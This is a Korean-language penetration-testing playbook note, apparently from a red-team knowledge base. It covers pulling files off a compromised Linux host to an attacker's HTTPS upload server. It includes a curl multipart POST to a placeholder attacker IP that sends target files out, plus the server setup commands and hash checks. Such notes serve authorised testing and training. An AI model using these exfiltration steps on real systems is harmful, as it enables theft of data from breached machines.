---
tags:
  - 환경/linux
시작조건: ["Linux 대상 셸 확보", "Linux 대상에서 공격 호스트의 HTTP 또는 HTTPS 수신 포트로 연결 가능"]
필요권한: ["Linux 대상 파일 읽기 권한", "공격 호스트에서 수신 파일 저장 권한"]
필요조건: ["업로드할 파일", "공격 호스트 HTTP 주소·포트", "Linux 대상의 curl"]
결과: ["Linux 대상에서 공격 호스트로 회수한 파일", "송신본과 수신본의 SHA-256 비교 결과"]
---

# Linux HTTP 파일 회수

## 한 줄 판단

Linux 대상 셸에서 회수할 파일을 읽을 수 있고 공격 호스트의 HTTP·HTTPS 수신 포트에 연결할 수 있으면 `curl` multipart POST로 파일을 전송하고 수신본의 크기와 SHA-256을 비교한다.

## 사용할 때

- Linux 대상의 로그·설정·덤프 파일을 공격 호스트로 회수할 때.
- SSH·SMB 파일 회수 경로는 없지만 HTTP outbound가 가능할 때.
- 여러 파일을 multipart 요청 하나로 전송해야 할 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 대상 파일 | 현재 Linux 계정으로 읽기 가능 | `ls -l`, `sha256sum` | 경로와 파일 권한 확인 |
| 네트워크 방향 | Linux 대상에서 공격 호스트 수신 포트 도달 | `curl` 연결 결과와 수신 로그 | 주소, route, proxy와 방화벽 확인 |
| 수신 endpoint | multipart 파일 업로드 처리 가능 | 업로드 서버의 `/upload` 경로 확인 | URL과 POST 형식 확인 |
| TLS 조건 | HTTPS 사용 시 인증서 신뢰 상태 확인 | `curl` 인증서 오류 | 자체 서명 테스트 인증서에만 `--insecure` 사용 |

## 실행

### Linux 공격 호스트에서 HTTPS 수신기 시작

자체 서명 인증서가 필요한 실습 환경의 예시다.

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
python3 -m uploadserver 443 --server-certificate ./server.pem
```

확인할 출력:

- `File upload available at /upload`.
- `Serving HTTPS on ... port 443`과 실제 요청 로그.

### Linux 대상 호스트에서 multipart 업로드

```bash
sha256sum <SOURCE_FILE_1> <SOURCE_FILE_2>
curl -X POST https://<ATTACKER_IP>:443/upload -F 'files=@<SOURCE_FILE_1>' -F 'files=@<SOURCE_FILE_2>' --insecure
```

`--insecure`는 위에서 만든 자체 서명 인증서를 사용하는 경우에만 적용한다. 신뢰할 수 있는 인증서를 쓰면 제거한다.

공격 호스트에서 수신 파일을 확인한다.

```bash
ls -l <RECEIVED_FILE_1> <RECEIVED_FILE_2>
sha256sum <RECEIVED_FILE_1> <RECEIVED_FILE_2>
```

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 업로드 서버에 파일 저장, 크기와 SHA-256 일치 | HTTP 파일 회수 완료 | Linux 대상 파일 회수 | 필요한 분석 수행 |
| `curl`은 종료됐지만 수신 파일이 없음 | endpoint 또는 multipart 필드 불일치 | 회수 미완료 | `/upload`, `files=@...`와 서버 로그 확인 |
| 인증서 검증 실패 | HTTPS 인증서 신뢰 문제 | 연결 전 실패 | 인증서·호스트명을 수정하거나 자체 서명 실습 조건에서만 `--insecure` 사용 |
| `Failed to open/read local data` | 대상 파일 읽기 또는 경로 문제 | 업로드 시작 전 실패 | 현재 계정, 파일 ACL과 경로 확인 |
| 수신 파일 hash 불일치 | 중단 전송 또는 다른 파일 수신 | 손상된 회수 파일 | 파일명·크기와 요청 로그를 확인해 재전송 |

## 확인할 출력과 권한

- 대상 파일 읽기, TLS·TCP 연결, multipart 요청, 수신 파일 저장과 hash 일치를 각각 확인한다.
- `curl` 종료 코드만으로 수신 서버가 파일을 완전히 저장했다고 판단하지 않는다.

## 관련 도구

- [[curl]]
- [[openssl]]

## 관련 상태 라우터

- [[상황별 파일 전송]]
